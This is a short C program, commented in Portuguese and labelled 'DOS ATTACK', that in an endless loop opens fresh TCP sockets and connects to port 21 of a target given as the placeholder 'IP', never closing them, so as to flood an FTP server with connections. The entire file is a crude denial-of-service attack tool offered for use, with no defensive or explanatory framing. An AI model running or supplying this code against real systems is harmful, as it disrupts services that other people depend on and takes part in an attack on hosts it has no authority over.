#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
int main(void){

	int meusocket;
	int conecta;

	struct sockaddr_in alvo;

	while(1){
		printf("DOS ATTACK\n");
		meusocket = socket(AF_INET,SOCK_STREAM,0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(21);
		alvo.sin_addr.s_addr = inet_addr("IP");

		conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

}
}
